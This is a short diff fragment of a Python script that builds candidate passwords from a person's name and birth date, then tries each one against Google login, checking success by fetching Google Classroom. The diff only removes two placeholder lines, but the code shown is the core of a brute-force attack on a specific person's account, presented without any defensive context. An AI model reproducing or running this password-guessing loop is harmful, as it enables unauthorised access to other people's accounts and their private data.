@@ -37,8 +37,6 @@ passwordList = [first[:2].upper() + last[:2] + str(month) + str(day) + str(x) + 
 
 #Loop through passwords
 for passwords in passwordList:
-    user = 'email'
-    pwd = 'the password goes here'
     session = SessionGoogle(url_login, url_auth, email, passwords)
     corr = session.get('http://classroom.google.com')
     corr = str(corr)
